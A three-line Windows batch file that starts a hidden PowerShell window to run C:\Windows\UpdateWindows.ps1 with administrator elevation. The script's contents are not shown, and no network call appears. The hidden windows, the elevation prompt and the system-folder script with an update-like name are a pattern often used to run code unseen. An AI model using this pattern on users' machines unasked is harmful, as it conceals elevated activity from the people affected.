@echo off
powershell -noprofile -command "&{ start-process powershell -windowstyle hidden -ArgumentList '-file C:\Windows\UpdateWindows.ps1 -windowstyle hidden' -verb RunAs}" -windowstyle hidden
exit